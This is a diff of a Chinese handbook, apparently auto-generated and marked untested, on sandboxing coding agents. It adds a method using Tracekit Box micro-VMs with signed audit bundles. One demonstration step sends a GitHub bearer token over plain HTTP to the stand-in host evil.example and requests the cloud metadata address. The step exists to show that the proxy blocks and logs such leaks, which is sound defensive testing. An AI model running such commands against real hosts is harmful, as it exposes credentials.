@@ -1,14 +1,14 @@
-# 让编码 agent 在受控环境里跑完并自己清理 worktree
+# 让编码 agent 在可控环境里动手，并留下能离线复核的证据
 
 > **未经实测**：本手册由 ai-work-radar 根据自动调研合并生成并持续修订，步骤尚未有人实际跑过。服务修订时基于自己保存的上一版重写，直接改这个文件会被覆盖；实测过的做法请写到 experiences/。
 >
-> 解决的问题：让编码 agent 在可控环境里按项目规则反复跑，能观察、能审批、能独立验收，并在任务完成后清理 worktree 残留。
-> 先试这一步：先在一个会产生 worktree 的非生产仓库里，把 T 的清理规则写进 AGENTS.md，跑 3–5 个任务后用 `git worktree list` 对比残留。
-> 最近修订：2026-10-28
+> 解决的问题：让编码 agent 在隔离、可回退、可审批、可审计的环境里按项目规则反复执行任务，并由你自己跑测试验收，而不是在本机随手跑一次就相信它的自述。
+> 先试这一步：先在一个可丢弃的仓库里写一份短 CLAUDE.md 加 .claude/settings.json 的 allow/ask/deny，跑 3–5 个边界清晰的小任务，每轮结束后自己跑测试、看 diff。
+> 最近修订：2026-10-30
 
 ## 解决什么问题
 
-本手册把编码 agent（Claude Code / Codex CLI / OpenCode / goose / pi / agentbox / Xiryn / Omnara 等）从「在本机随手跑一次」变成「在可控环境里、按项目规则反复跑」，并能实时看到它在读什么、写什么，需要时在真实（仿真）系统里执行并拿到可判定结果；断网或数据不出本机时，也能用本地模型跑小任务并用项目自带测试独立验收。二十条做法 A-T 覆盖：A 自托管工作区；B MCP 供给；C 项目级护栏；D 只读规划/放权编辑；E Codex CLI 起步；F Claude Mods 受控试点；G pi 容器化；H 观察面与危险命令闸门；I 手机审批与通知；J QEMU guest 验证；K 云端一次性 VM；L 每 agent 独立沙箱桌面；M 换实现对比迁移；N tmux 保活与脚本化外壳；O Harp 多会话状态侧栏与 tmux 接管；P openspaces 多机线程与沙箱；Q Omnara 托管代理平台小范围试用；R WardenDeck 飞书审批闸门与审计链；S 离线本地模型编码 agent 冒烟与验收；T 把 worktree 清理写成 AGENTS.md 规则，任务完成时删除 worktree 及分支并检查残留。
+本手册把编码 agent（Claude Code / Codex CLI / OpenCode / goose / pi / agentbox / Xiryn / Omnara 等）从「在本机随手跑一次」变成「在可控环境里、按项目规则反复跑」，并能实时看到它在读什么、写什么，需要时在真实（仿真）系统里执行并拿到可判定结果；断网或数据不出本机时，也能用本地模型跑小任务并用项目自带测试独立验收；需要给每个任务留下可离线复核的证据时，把任务关进无网卡的 micro-VM，由宿主 signer 逐项放行并导出签名审计包。二十一条做法 A-U 覆盖：A 自托管工作区；B MCP 供给；C 项目级护栏；D 只读规划/放权编辑；E Codex CLI 起步；F Claude Mods 受控试点；G pi 容器化；H 观察面与危险命令闸门；I 手机审批与通知；J QEMU guest 验证；K 云端一次性 VM；L 每 agent 独立沙箱桌面；M 换实现对比迁移；N tmux 保活与脚本化外壳；O Harp 多会话状态侧栏与 tmux 接管；P openspaces 多机线程与沙箱；Q Omnara 托管代理平台小范围试用；R WardenDeck 飞书审批闸门与审计链；S 离线本地模型编码 agent 冒烟与验收；T 把 worktree 清理写成 AGENTS.md 规则，任务完成时删除 worktree 及分支并检查残留；U 用 Tracekit Box 把单个任务关进 Firecracker micro-VM，网络、密钥、模型调用、命令和代码改动都经宿主 signer 决定并签名，任务结束导出 `.tkb` 离线验证。
 
 ## 适用与不适用
 
@@ -27,23 +27,24 @@
 | K | 有 Pro/Max/Team/Enterprise，想把边界清晰任务放云端并行 | Console API key 或第三方 provider 不适用；routines 是 research preview、projects 是 public beta；网络 None 仍会向 Anthropic API 发请求 |
 | L | 想在个人电脑自托管、每 agent 一台隔离 Linux 桌面、凭据不进视野、可手机接管 | 仅 49 star、无第三方评测、定时/循环未实现、单体架构、需要 Docker，配置表在本次材料截断 |
 | M | 想在 OpenCode 或现有编码代理之外换一个实现跑同一批任务对比 | 仅 35 stars，run 端到端未在有余额 provider 上验证，README 主体是工程修复记录 |
-| N | 编码 agent 长期挂终端、SSH 断线仍要继续、多仓库/多任务需要统一入口、想用脚本 send-keys 驱动并用 capture-pane 读回、把输出落盘成全量日志 | 需要完成事件或结构化状态、重启机器后仍要恢复会话、不能运行 tmux、iTerm2 上想用 tmux 命令附着内置 native panes、把 tmux 当权限/审批系统的人；状态检测靠屏幕抓取，不能当作可靠完成信号 |
+| N | 编码 agent 长期挂终端、SSH 断线仍要继续、多仓库/多任务需要统一入口、想用脚本 send-keys 驱动并用 capture-pane 读回 | 需要完成事件或结构化状态、重启机器后仍要恢复会话、不能运行 tmux、iTerm2 上想用 tmux 命令附着内置 native panes、把 tmux 当权限/审批系统的人；状态检测靠屏幕抓取，不能当作可靠完成信号 |
 | O | 在 macOS 上并排跑多个 Claude Code/Codex 长任务、需要按状态排序的侧栏、想让 tmux 会话在重启后仍保留分组与顺序、想从手机 ssh 接管同一会话 | 非 macOS、不能接受非官方 Warp fork 与 AGPL-3.0、上游登录未测试却要求稳定登录、想把它当自动化编排器、需要精确完成事件而不是侧栏状态、没有能力维护额度环 JSON；它只显示状态与同步 tmux 布局，不做定时触发、失败重试或任务队列 |
 | P | 想把同一任务发到多台计算机或沙箱、需要线程续聊/日志/人工接管、愿意先在两三台机器小范围试跑只读诊断和单仓库修测试 | 需要内置定时器/cron/webhook/事件触发器/任务队列/重试；把 codex/gemini/opencode 适配器直接上生产（README 按文档写、未实机验证）；把 local/ssh 默认权限当强隔离；需要中继/计量/账号体系 |
 | Q | 需要跨机器/跨用户、由 app/Slack/GitHub/定时触发的云代理，希望把长期运行/远程监督/审批/断点恢复放到托管运行层，且有工程运维能力愿意小范围试用 | 简单一次性任务不必上平台；没有独立评测/成熟度证据，不宜全面 adopt；自托管本地默认配置故意不安全；沙箱需 public URL；权限具体配置、cron 完整参数、memory/subagents 配置材料只给链接，不能照抄 |
 | R | 已在用 Claude Code，想把审批和观察搬到手机/飞书，需要逐工具审批、macOS 内核沙箱和只追加哈希链审计 | 自标 prototype、40 stars，执行端只有 Claude Code（Codex 能探测到但没接通），内核级沙箱仅 macOS、Linux 需自行用专用用户或容器兜底，笔记本休眠即离线，无定时/状态触发，单条消息 10 分钟无输出/30 分钟/100 次工具调用上限 |
 | S | 断网/隐私受限、项目依赖和测试已在本机、需要小范围修复/解释/小重构 | 公开证据只有一次单行 bug 修复；未测大仓库、陌生框架、复杂依赖；不能下载新包/上网查资料；需要足够内存；`opencode.json` 完整内容不在材料内 |
 | T | 项目已有 `AGENTS.md` 且智能体会读取并遵守；工作流会创建 git worktree，尤其 subagent 的 `.claude/worktrees/agent-*`；智能体有删除 worktree 和分支的权限 | 证据只有一条推文和一个 AGENTS.md 示例链接；规则片段在「它专用的 cargo target」处截断，删除命令、分支命名规则、cargo target 处理细节不可见；无验证数据；不能防误删，需额外保护未合并工作 |
+| U | Linux + KVM 主机上，agent 要改真实系统又需要隔离与可审计；想把一次任务导出成 `.tkb` 离线验证；在 GitHub Actions 里跑 Claude Code/Codex 修测试，并只在 signer 逐文件放行后应用改动 | v0、无 release、需从源码构建；必须自带并常驻 Tracekit signer，同机 dev signer 只有 `Assurance: dev`、`isolation: same-user`；Action 里的 dev signer 没有 witness，只证明 job 后记录未被改动，不证明 runner 本身诚实；Mac 只能按 docs/development.md 走 Lima VM；无 KVM 的机器跑不起来；材料没有并发调度、成本、性能数据 |
 
 ## 前置条件
 
 通用：非生产、可回退的仓库或环境；受管/涉密环境先审阅所有 `curl | bash`、`irm | iex`、`./install.sh`、`./setup.sh` 类脚本，或改用包管理器/源码审阅后执行。
 
-A：Linux 服务器 + systemd + 本地 Docker；Ubuntu 22.04+/Debian 12+ 可自动补依赖；源码构建需 Docker 访问权限。B：本机可装 CLI，有受支持供应商 key 或订阅，非生产环境。C：macOS/Linux/WSL、Node+npm 或 curl、真实 Git 项目、可回退。D：macOS/Linux/Windows 开发机，安装前清 0.1.x 前旧版。E：Mac/Linux/Windows；ChatGPT 订阅需 Plus/Pro/Business/Edu/Enterprise；API key 需 additional setup。F：一次性项目、合成数据、无生产凭据、已批准 Claude Code、能设 `CLAUDE_CODE_ENABLE_FUNCTION_HOOKS=1`、能生成 `/plugin-types`、有回滚负责人。G：Node.js 22.19+、非关键可回退仓库、优先容器环境、模型订阅或 API key。H：Claude Code 2.1.287+（README 自述，无法独立验证）、Code 视图需 macOS+Chrome+图片终端、非关键 Git 仓库。I：macOS/Windows 10/11、已运行 Codex App、电脑保持唤醒联网、手机同局域网、通知需 Bark/ntfy。J：Python 3.8+、QEMU、Go 1.22+、首次联网、非关键环境。K：Pro/Max/Team/Enterprise 且 claude.ai 登录；GitHub 连接；private repo 装 Claude GitHub App；终端路径已用 `gh` 且可 `/web-setup`；`claude --cloud` 前先 push。L：约 4 GB 空闲磁盘、至少一个 provider key（必需）、Firecrawl 可选、Node ≥20.9、Docker；Telegram 可选。M：Node 18+、可用 provider key、非关键小仓库；Homebrew 路径会拉 Rust 工具链。N：较新的 Claude Code，`claude --help` 能看到 `-w/--worktree` 与 `--tmux`；本机有 tmux；远程机器可 SSH；iTerm2 上内置路径用 native panes 而非真 tmux，脚本化必须加 `=classic`。O：macOS；从 Releases 下载 dmg 或按源码构建；源码构建需 `rust-toolchain.toml` 指定的 Rust 工具链；接受非官方 Warp fork、AGPL-3.0、上游登录未测试；要 tmux 同步需 tmux；额度环需能定期生成 `docs/limit-rings.md` 格式 JSON；Claude Code 后台任务 hook 可选。P：已装 Node.js / npm；目标机可 SSH 登录（README 建议用 Tailscale 处理 NAT）且已安装要用的智能体 CLI；macOS 26 可用 Apple 开源 `container` 运行时，或改用 Docker / Podman；Claude Code 订阅或 API key 用于 `claude setup-token`；人工接管需 Mac 开启屏幕共享或 Linux 运行绑定 localhost 的 VNC 服务；SDK 路径需 Node/TS 工程。Q：Omnara Cloud 账号；Node.js 22 或更新；使用首项目自带的模型 provider 和 sandbox pool。SDK 路径需 dashboard 创建 API key、导出 `OMNARA_TOKEN`、`npm install @omnara/sdk`、用 `npx omnara config` 获得 org/project ID。自托管需 Docker 和 Compose；新实例需在控制台添加 model provider 和 model、在 Machines 连接本机并共享给项目；沙箱还需实例有 public URL。工具权限、cron 完整参数、memory/subagents 配置需查 docs.omnara.com，本次材料只给链接。R：Node.js >= 22.13（依赖内置 `node:sqlite`）；macOS 或 Linux（内核级沙箱仅 macOS 提供，Linux 需自行用专用用户或容器兜底）；Claude Code 已安装并登录、`claude` 在 `PATH` 上；一个飞书/Lark 账号，手机能打开授权链接；`init` 会创建 `~/.wardendeck`（权限 0700），需备份 `master.key` 与数据库。S：笔记本内存足够（9B 建议 12–16 GB 以上，64k 上下文再留余量）；装有 Python3；项目及依赖、测试、README 已在本地；先在一次联网会话里完成安装和模型下载；OpenCode 1.19.4 与 `qwen3.5:9b` 需在自己环境核实。T：项目已有 `AGENTS.md` 且智能体会读取并遵守；项目工作流确实创建 git worktree（含 subagent 的 `.claude/worktrees/agent-*`）；智能体具备删除 worktree 和分支的权限；需要知道 worktree 路径；原文提到专用 cargo target，但材料截断，需按 `https://github.com/JimLiu/baocut/blob/main/AGENTS.md` 示例核对。
+A：Linux 服务器 + systemd + 本地 Docker；Ubuntu 22.04+/Debian 12+ 可自动补依赖；源码构建需 Docker 访问权限。B：本机可装 CLI，有受支持供应商 key 或订阅，非生产环境。C：macOS/Linux/WSL、Node+npm 或 curl、真实 Git 项目、可回退。D：macOS/Linux/Windows 开发机，安装前清 0.1.x 前旧版。E：Mac/Linux/Windows；ChatGPT 订阅需 Plus/Pro/Business/Edu/Enterprise；API key 需 additional setup。F：一次性项目、合成数据、无生产凭据、已批准 Claude Code、能设 `CLAUDE_CODE_ENABLE_FUNCTION_HOOKS=1`、能生成 `/plugin-types`、有回滚负责人。G：Node.js 22.19+、非关键可回退仓库、优先容器环境、模型订阅或 API key。H：Claude Code 2.1.287+（README 自述，无法独立验证）、Code 视图需 macOS+Chrome+图片终端、非关键 Git 仓库。I：macOS/Windows 10/11、已运行 Codex App、电脑保持唤醒联网、手机同局域网、通知需 Bark/ntfy。J：Python 3.8+、QEMU、Go 1.22+、首次联网、非关键环境。K：Pro/Max/Team/Enterprise 且 claude.ai 登录；GitHub 连接；private repo 装 Claude GitHub App；终端路径已用 `gh` 且可 `/web-setup`；`claude --cloud` 前先 push。L：约 4 GB 空闲磁盘、至少一个 provider key（必需）、Firecrawl 可选、Node ≥20.9、Docker；Telegram 可选。M：Node 18+、可用 provider key、非关键小仓库；Homebrew 路径会拉 Rust 工具链。N：较新的 Claude Code，`claude --help` 能看到 `-w/--worktree` 与 `--tmux`；本机有 tmux；远程机器可 SSH；iTerm2 上内置路径用 native panes 而非真 tmux，脚本化必须加 `=classic`。O：macOS；从 Releases 下载 dmg 或按源码构建；源码构建需 `rust-toolchain.toml` 指定的 Rust 工具链；接受非官方 Warp fork、AGPL-3.0、上游登录未测试；要 tmux 同步需 tmux；额度环需能定期生成 `docs/limit-rings.md` 格式 JSON；Claude Code 后台任务 hook 可选。P：已装 Node.js / npm；目标机可 SSH 登录（README 建议用 Tailscale 处理 NAT）且已安装要用的智能体 CLI；macOS 26 可用 Apple 开源 `container` 运行时，或改用 Docker / Podman；Claude Code 订阅或 API key 用于 `claude setup-token`；人工接管需 Mac 开启屏幕共享或 Linux 运行绑定 localhost 的 VNC 服务；SDK 路径需 Node/TS 工程。Q：Omnara Cloud 账号；Node.js 22 或更新；使用首项目自带的模型 provider 和 sandbox pool。SDK 路径需 dashboard 创建 API key、导出 `OMNARA_TOKEN`、`npm install @omnara/sdk`、用 `npx omnara config` 获得 org/project ID。自托管需 Docker 和 Compose；新实例需在控制台添加 model provider 和 model、在 Machines 连接本机并共享给项目；沙箱还需实例有 public URL。工具权限、cron 完整参数、memory/subagents 配置需查 docs.omnara.com，本次材料只给链接。R：Node.js >= 22.13（依赖内置 `node:sqlite`）；macOS 或 Linux（内核级沙箱仅 macOS 提供，Linux 需自行用专用用户或容器兜底）；Claude Code 已安装并登录、`claude` 在 `PATH` 上；一个飞书/Lark 账号，手机能打开授权链接；`init` 会创建 `~/.wardendeck`（权限 0700），需备份 `master.key` 与数据库。S：笔记本内存足够（9B 建议 12–16 GB 以上，64k 上下文再留余量）；装有 Python3；项目及依赖、测试、README 已在本地；先在一次联网会话里完成安装和模型下载；OpenCode 1.19.4 与 `qwen3.5:9b` 需在自己环境核实。T：项目已有 `AGENTS.md` 且智能体会读取并遵守；项目工作流确实创建 git worktree（含 subagent 的 `.claude/worktrees/agent-*`）；智能体具备删除 worktree 和分支的权限；需要知道 worktree 路径；原文提到专用 cargo target，但材料截断，需按 `https://github.com/JimLiu/baocut/blob/main/AGENTS.md` 示例核对。U：Linux x86_64 或 arm64，daemon 用户能打开 `/dev/kvm`（裸机、支持嵌套虚拟化的云 VM，或 GitHub 托管的 `ubuntu-latest` runner，action 会启用 KVM）；Mac 按 docs/development.md 走 Lima VM；装 `e2fsprogs`（需要 `mkfs.ext4`）和 `git`；同一主机安装 Tracekit 1.4.2 signer，开发环境可先 `tracekit init --dev --v2 --no-hooks && tracekit up --wait`；主机能出站 HTTPS 到镜像仓库（Docker Hub 或 GHCR）；daemon 首次启动会从 GitHub 下载 Firecracker v1.17.0、从 Firecracker 项目的 S3 下载 guest kernel 6.1.155，按 SHA-256 校验后缓存到 `<state dir>/images/assets`，无外网时用 `tkbox daemon --firecracker FILE --kernel FILE` 传本地文件。
 
 ## 操作步骤
 
-按环境选：A 要服务器工作区；B 要通用 agent+MCP；C 要 Claude Code 项目护栏；D 要 OpenCode build/plan 分工；E 要 Codex CLI 起步；F 要 Claude Mods 受控试点；G 要 pi 容器化+多 provider；H 要观察面与危险命令闸门；I 要 Codex 会话接手机；J 要 QEMU guest 验证；K 要云端一次性 VM；L 要每 agent 独立 Linux 桌面；M 要 opencode-rust 对比；N 要 tmux 保活/脚本化/读回；O 要 Harp 侧栏多会话状态与 tmux 接管；P 要 openspaces 多机线程与沙箱；Q 要 Omnara 托管代理平台小范围试用；R 要 WardenDeck 飞书审批与审计链；S 要断网/隐私受限时用本地模型跑小任务并用项目自带测试验收；T 要把 worktree 清理写进 AGENTS.md 并检查残留。做法 C 可与 A 叠加；F 是 C 的扩展面试点；H 是第三方插件集合，不替代 F；I 与 E 并存；J 补执行目标；K 补会话跑在哪里；L 与 A 不同层；M 与 D 是同一层两个实现；N 是 C/E/K 等做保活外壳；O 是 C/E/N 等做状态侧栏与 tmux 布局同步，不替代 N 的脚本化外壳，也不是自动化编排器；P 与 A/L 不同层，是发起方统一管理多机线程的直连层，可与 C/E 的 agent 规则叠加，不替代 N 的 tmux 脚本化，也不替代 O 的状态侧栏，且不提供定时/重试；Q 与 C/E/K 等互补：Claude Code/Codex/OpenCode 是单终端/单机 agent loop，Omnara 补云托管、跨机器、跨用户、Slack/GitHub/定时触发，可用 MCP 让 Claude Code 管理 Omnara 代理；Q 不替代 C 的项目护栏，也不替代 N/O/P 的本地/多机外壳；R 是 C/E/K 等的授权与审计层：Claude Code 仍是唯一执行引擎，WardenDeck 在其上补移动触发、逐工具审批、macOS 内核沙箱和哈希链审计，不替代 C 的项目护栏，也不替代 N/O/P 的本地/多机外壳，且不提供定时触发；S 与 D 是同一工具不同配置：D 是 build/plan 与桌面版，S 是离线本地模型；S 与 C/E/K 等不冲突，是断网/隐私受限时的补充路径；S 不能替代 A/L 的隔离，因为模型、依赖、测试都在本机；T 是项目规则层，补 N 的 worktree 收尾，可与 C 的 CLAUDE.md/规则并存；T 不替代隔离、审批、验收或 tmux 保活。
+按环境选：A 要服务器工作区；B 要通用 agent+MCP；C 要 Claude Code 项目护栏；D 要 OpenCode build/plan 分工；E 要 Codex CLI 起步；F 要 Claude Mods 受控试点；G 要 pi 容器化+多 provider；H 要观察面与危险命令闸门；I 要 Codex 会话接手机；J 要 QEMU guest 验证；K 要云端一次性 VM；L 要每 agent 独立 Linux 桌面；M 要 opencode-rust 对比；N 要 tmux 保活/脚本化/读回；O 要 Harp 侧栏多会话状态与 tmux 接管；P 要 openspaces 多机线程与沙箱；Q 要 Omnara 托管代理平台小范围试用；R 要 WardenDeck 飞书审批与审计链；S 要断网/隐私受限时用本地模型跑小任务并用项目自带测试验收；T 要把 worktree 清理写进 AGENTS.md 并检查残留；U 要把任务关进 micro-VM 并导出可离线验证的审计包。做法 C 可与 A 叠加；F 是 C 的扩展面试点；H 是第三方插件集合，不替代 F；I 与 E 并存；J 补执行目标；K 补会话跑在哪里；L 与 A 不同层；M 与 D 是同一层两个实现；N 是 C/E/K 等做保活外壳；O 是 C/E/N 等做状态侧栏与 tmux 布局同步，不替代 N 的脚本化外壳，也不是自动化编排器；P 与 A/L 不同层，是发起方统一管理多机线程的直连层，可与 C/E 的 agent 规则叠加，不替代 N 的 tmux 脚本化，也不替代 O 的状态侧栏，且不提供定时/重试；Q 与 C/E/K 等互补：Claude Code/Codex/OpenCode 是单终端/单机 agent loop，Omnara 补云托管、跨机器、跨用户、Slack/GitHub/定时触发，可用 MCP 让 Claude Code 管理 Omnara 代理；Q 不替代 C 的项目护栏，也不替代 N/O/P 的本地/多机外壳；R 是 C/E/K 等的授权与审计层：Claude Code 仍是唯一执行引擎，WardenDeck 在其上补移动触发、逐工具审批、macOS 内核沙箱和哈希链审计，不替代 C 的项目护栏，也不替代 N/O/P 的本地/多机外壳，且不提供定时触发；S 与 D 是同一工具不同配置：D 是 build/plan 与桌面版，S 是离线本地模型；S 与 C/E/K 等不冲突，是断网/隐私受限时的补充路径；S 不能替代 A/L 的隔离，因为模型、依赖、测试都在本机；T 是项目规则层，补 N 的 worktree 收尾，可与 C 的 CLAUDE.md/规则并存；T 不替代隔离、审批、验收或 tmux 保活；U 是隔离+审计层：C/E 的规则管 agent 做什么，U 管它能碰到什么、每次触碰是否被签名记录，可与 C 的 CLAUDE.md 和 E 的 CLI 叠加；U 不替代 N/O/P 的保活与多机会话，也不提供定时触发、任务队列或重试（Action 的触发来自 CI job 本身）。
 
 ### 做法 A：Linux 服务器 agentbox
 
@@ -638,6 +639,97 @@ worktree 不遗留：在 worktree（含 subagent 的 .claude/worktrees/agent-*�
 4. 权限与安全边界：若智能体没有删除 worktree 和分支的权限，需要人工执行同样规则，或先调整权限与安全边界；规则必须写明触发点是「任务完成时」，让清理动作由完成状态触发，而不是只写在文档里不执行。预期：清理动作由完成状态触发，且不会越权。
 5. 验收：每个任务完成后检查 `git worktree list`、相关分支和原文提到的 cargo target 目录是否残留；与试用前同样数量任务做对比。预期：能记录残留 worktree 数、残留分支数、人工清理耗时、误删或破坏未合并工作的次数。
 
+### 做法 U：Tracekit Box 每任务独立 micro-VM 与可离线验证的审计包
+
+1. 准备前提（缺一项就先不要往下走）：Linux x86_64 或 arm64，daemon 用户能打开 `/dev/kvm`（裸机、支持嵌套虚拟化的云 VM，或 GitHub 托管的 `ubuntu-latest` runner，action 会启用 KVM；Mac 用 docs/development.md 的 Lima VM）；安装 `e2fsprogs`（需要 `mkfs.ext4`）和 `git`；同一主机安装 Tracekit 1.4.2 signer，开发环境先跑 `tracekit init --dev --v2 --no-hooks && tracekit up --wait`（README 说明更高保证需要把 signer 作为独立用户运行，并在另一台主机放 witness 共同签名 signer 日志）；主机能出站 HTTPS 到镜像仓库（Docker Hub 或 GHCR）。预期：`/dev/kvm` 可打开、signer 起来、能拉镜像；daemon 首次启动会从 GitHub 下载 Firecracker v1.17.0、从 Firecracker 项目的 S3 下载 guest kernel 6.1.155，按 SHA-256 校验后缓存到 `<state dir>/images/assets`，无外网时改用本地文件。
+2. 从源码构建并安装（前提：Go 版本按 go.mod，已装 make；当前没有 release）：
+
+```sh
+git clone https://github.com/Cygnux-Labs/tracekit-box && cd tracekit-box
+make linux                     # bin/tkbox-linux-{amd64,arm64} and bin/tkbox-guest-linux-{amd64,arm64}
+arch=$(uname -m); case "$arch" in x86_64) arch=amd64 ;; aarch64) arch=arm64 ;; esac
+sudo install -m 0755 "bin/tkbox-linux-$arch" /usr/local/bin/tkbox
+sudo install -m 0755 "bin/tkbox-guest-linux-$arch" /usr/local/bin/
+tkbox version
+```
+
+预期：`tkbox version` 有输出。`tkbox` 默认在自身二进制旁边找 `tkbox-guest-linux-<arch>`，也可用 `tkbox daemon --guest-dir DIR` 指定目录。
+3. 启动 dev signer 和 daemon（前提：同机已安装 Tracekit；daemon 启动时若没有 signer 应答会退出）：
+
+```sh
+tracekit init --dev --v2 --no-hooks && tracekit up --wait
+export GH_TOKEN=ghp_...   # any GitHub token
+tkbox daemon > "${TMPDIR:-/tmp}/tkbox-daemon.log" 2>&1 &
+until tkbox ls >/dev/null 2>&1; do sleep 1; done
+```
+
+预期：`tkbox ls` 能返回。dev signer 是 same-user，导出的 bundle 会显示 `Assurance: dev` 和 `isolation: same-user`。
+4. 创建一个 box（前提：在一个 git checkout 目录中执行；workspace 是 checkout 的副本）：
+
+```sh
+tkbox run --image python:3.12-slim --allow pypi --allow debian --workspace . --name demo \
+  --secret GH=env:GH_TOKEN@api.github.com --env PIP_ROOT_USER_ACTION=ignore --env PIP_DISABLE_PIP_VERSION_CHECK=1
+```
+
+预期：box 创建成功，VM 内只有 secret 占位符，真实值只在访问 `api.github.com` 时由宿主机代理换入。
+5. 执行命令并观察各道门（前提：box 已创建；示例中 `curl` 不在 python:3.12-slim，所以先用 debian 允许列表安装）：
+
+```sh
+tkbox exec demo --env DEBIAN_FRONTEND=noninteractive -- sh -c 'apt-get update -q && apt-get install -y -q curl'
+tkbox exec demo -- python -c 'print(1+1)'
+tkbox exec demo -- pip install -q requests
+tkbox exec demo -- curl -sI https://example.com
+tkbox exec demo -- curl -sS https://169.254.169.254/
+tkbox exec demo -- sh -c 'echo "$GH"'
+tkbox exec demo -- sh -c 'curl -sS -H "Authorization: Bearer $GH" http://evil.example/'
+tkbox exec demo -- sh -c 'curl -sS -H "Authorization: Bearer $GH" https://api.github.com/user | grep "\"login\""'
+```
+
+预期：`example.com` 不在 allowlist，会被挂起，需在宿主机另一个终端运行 `tkbox approvals` 查看 id，再运行 `tkbox approve <id>` 或 `tkbox reject <id>`；无人处理则 2 分钟后拒绝。`169.254.169.254` 是云 metadata 地址，无论 allowlist 或人工批准都会直接拒绝。`echo "$GH"` 只打印占位符。`evil.example` 用明文 HTTP 携带 `GH` 占位符到未绑定主机时会被代理立即阻断并记录 `tkbox.secret.leak`；`api.github.com` 是 `GH` 绑定主机，代理会换入真实 token 的 `Authorization` 头并记录 `tkbox.secret.use`。
+6. 取回改动、停止、导出并离线验证（前提：`apply` 只能在已停止的 box 上、导出前执行）：
+
+```sh
+tkbox exec demo -- sh -c 'echo hi > /workspace/x.txt' && tkbox diff demo
+tkbox stop demo && tkbox export demo -o demo.tkb
+tracekit verify demo.tkb --trust demo.trust.json
+```
+
+预期：`tkbox diff demo` 显示 git-format patch；`tracekit verify` 离线检查 bundle，成功打印 `Integrity: VERIFIED.`，用 dev signer 时还会打印 `Assurance: dev` 和 `isolation: same-user`。若执行 `tkbox apply demo`，它会对每个文件先问 signer，再写入你的 checkout；示例 demo 不 apply。README 提醒：应固定你预期的 trust 文件（提交到仓库或放在 CI 外），不要直接信任 bundle 旁边附带的那个。
+7. 在 GitHub Actions 中跑 agent（前提：使用 GitHub 托管的 ubuntu-latest；action 会启用 KVM、启动 dev signer 和 daemon）：
+
+```yaml
+jobs:
+  fix:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - uses: Cygnux-Labs/tracekit-box/action@main
+        with:
+          agent: claude-code
+          prompt: "Make the failing test in test/parser.test.js pass. Do not change the test."
+        env:
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+```
+
+预期：action 在 box 中跑 Claude Code、Codex 或一条命令，停止 box 后，仅当 signer 允许每个文件且没有敏感文件（如 `.github/workflows/**`）时才应用改动，然后导出、验证并上传 bundle。注意：action 的 signer 是同一 job 内创建的 dev signer，没有 witness，所以 bundle 只能验证为 `Assurance: dev`——它证明记录在 job 后未被改动，不证明 runner 本身诚实。action 会把 agent 改动应用到 runner 的 checkout，随后构建/测试这些改动等于在 runner 上运行 agent 的代码；examples/claude-code-fix.yml 给出的安全形状是三个 job：一个用只读 token 跑 box，一个用只读、不持久化、无 secret 的 token 测试 patch，第三个持有写 token 开 PR 且从不运行仓库代码。
+8. 用 Python SDK 调 daemon（前提：Python 3.9+，从 checkout 安装 `pip install ./sdk/python`）：
+
+```python
+from tracekit_box import Client
+
+c = Client()
+c.create_box("python:3.12-slim", name="demo", allow=["pypi"], workspace=".")
+print(c.exec("demo", ["python", "-c", "print(1+1)"]).stdout_text)
+```
+
+预期：`create_box` 建出 box，`exec` 返回 stdout。
+
+失败时的行为（按原文，不是你的兜底）：系统是 fail closed——没有 signer 就没有 daemon，signer 不应答会拒绝后续命令、连接和文件写入；无法记录必须保留的事件时会停止 box 并记 `tkbox.gap`。
+
 ## 怎么判断变好了
 
 A：用量页按用户/模型/时间过滤 tokens、成本来源、单轮延迟，可 CSV 导出；缓存命中率 `cache reads / (uncached input + cache reads + cache writes)`；每条回复显示时间、模型、设置快照和记录成本；变更页看 diff 和整文件。无效果评测。
@@ -680,6 +772,8 @@ S：最小试用：挑一个 1–2 小时内能读完、已有测试套件的小
 
 T：最小试用：选一个会产生 worktree 的代码仓库，按上述方式把规则写入 AGENTS.md，先跑 3–5 个真实任务，覆盖普通任务和 subagent 任务。每个任务完成后检查 `git worktree list`、相关分支和原文提到的 cargo target 目录是否残留；与试用前同样数量的任务做对比。看每 N 个任务后的残留 worktree 数、残留分支数、人工清理耗时、误删或破坏未合并工作的次数；同时确认任务完成质量没有下降。若残留明显减少且无误删，再扩大范围；若出现误删或规则未被遵守，先补充权限、保护规则和验收检查。原文没有给出指标，这些是试用设计。
 
+U：最小试用：在一次性 Linux+KVM 主机或 GitHub Actions 中，按本文第 4–6 步跑一个修测试任务，导出 `.tkb` 并用固定 trust 文件离线验证；先不 apply，只看 diff。跑一个任务周期或半天即可。可观察：`tkbox diff` 是否是 git-format patch；`tracekit verify` 是否打印 `Integrity: VERIFIED.`、Assurance 是否为 `dev`；`tkbox approvals` 的挂起与 `approve`/`reject` 是否符合预期、无人处理是否 2 分钟后拒绝；`echo "$GH"` 是否只打印占位符；明文 HTTP 到未绑定主机是否被阻断并记 `tkbox.secret.leak`；绑定主机是否记 `tkbox.secret.use`；metadata 地址是否直接拒绝；日志里是否出现 `tkbox.gap`；同一个 agent 改动在有 U 与无 U（本机直接跑）两组之间，人工复核时间、需要回滚的次数、你愿意让它碰的仓库范围是否变化。原文没有效果数据，以上是本手册提出的试用设计。
+
 ## 常见坑
 
 - A：agentbox 默认 bypassPermissions、凭据可被终端用户读、单机单进程；撤销账号访问不会收回已下发凭据、不会终止运行进程；Web 提交不 push、不跑 Git hooks/签名；默认备份不含工作区；持久文件只放 `/workspace`、`/home/agent`、每用户 `/shared`；容器停止或重建就终止进程。
@@ -702,6 +796,7 @@ T：最小试用：选一个会产生 worktree 的代码仓库，按上述方式
 - R：自标 prototype、40 stars、MIT；执行端只有 Claude Code（Codex 能探测到但没接通）；内核级沙箱仅 macOS，Linux 需自行用专用用户或容器兜底；笔记本休眠即离线；无定时触发/状态触发，任务只能由人发消息启动；单条消息有 10 分钟无输出、30 分钟实际耗时、100 次工具调用上限，长批处理要拆多条；`--workdir` 指向的目录就是 agent 能碰的范围，别指向生产仓库；`master.key` 不备份则换机后凭据不可恢复；`allowed_users` 不写默认只允许应用所有者；群聊必须用 `oc_...` 群 ID 且只有 @ bot 才响应；`bypassPermissions` 危险；macOS 沙箱可用 `WARDENDECK_SANDBOX=0` 关闭但不推荐；默认关闭 Claude Code 内置自动记忆以避免事实跨 bot 泄漏。
